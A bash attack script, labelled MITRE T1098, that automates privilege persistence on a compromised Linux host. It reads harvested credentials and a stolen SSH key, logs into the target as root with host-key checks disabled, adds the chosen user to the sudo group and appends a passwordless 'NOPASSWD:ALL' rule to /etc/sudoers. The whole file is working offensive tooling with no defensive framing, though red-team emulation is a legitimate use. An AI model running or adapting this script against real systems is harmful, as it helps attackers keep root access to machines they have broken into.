#!/bin/bash
# T1098 - Modify existing user privileges for persistence

# Variables
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
TARGET_IP="$1"
#USERNAME="user"   
CREDENTIALS_FILE="/home/attacks/found_credentials_$TARGET_IP.txt"                                                       
PRIVATE_KEY_PATH="/home/attacks/id_rsa_$TARGET_IP"   
#PASSWORD="password123"                         

# Check if credentials file exists
if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Credentials file not found at $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Extract the first valid username and password from the credentials file
CREDENTIAL=$(head -n 1 "$CREDENTIALS_FILE")
if [ -z "$CREDENTIAL" ]; then
    echo "Error: No credentials found in $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Parse username and password
USERNAME=$(echo "$CREDENTIAL" | awk -F ',' '{print $2}')
PASSWORD=$(echo "$CREDENTIAL" | awk -F ',' '{print $3}')

# Check if private key file exists
if [ ! -f "$PRIVATE_KEY_PATH" ]; then
    echo "Error: SSH private key file not found at $PRIVATE_KEY_PATH. Exiting."
    exit 1
fi

# Function to execute commands on the target server
execute_remote_command() {
    ssh -i "$PRIVATE_KEY_PATH" -o StrictHostKeyChecking=no root@"$TARGET_IP" << EOF
        echo "Connected to target as root."

        # Check if the user exists
        if id "$USERNAME" &>/dev/null; then
            echo "$USERNAME exists. Updating permissions..."
            
            # Add the user to sudo group
            usermod -aG sudo "$USERNAME"
            
            # Add the user to sudoers file for passwordless root privileges
            if ! grep -q "^$USERNAME ALL=(ALL) NOPASSWD:ALL" /etc/sudoers; then
                echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
                echo "User $USERNAME added to sudoers file with full privileges."
            else
                echo "User $USERNAME already has passwordless sudo privileges."
            fi
        else
            echo "User $USERNAME does not exist. Aborting."
            exit 1
        fi

        # Validate sudoers file
        visudo -c || echo "WARNING: /etc/sudoers contains syntax errors."
EOF
}

# Test SSH connectivity
ssh -i "$PRIVATE_KEY_PATH" -o BatchMode=yes -o StrictHostKeyChecking=no root@"$TARGET_IP" exit
if [[ $? -ne 0 ]]; then
    echo "Error: Unable to connect to target $TARGET_IP with the provided key or connection issue. Aborting."
    exit 1
fi
# Main execution
echo "Executing remote command..."
execute_remote_command
echo "Done. Verify user privileges on the target server."

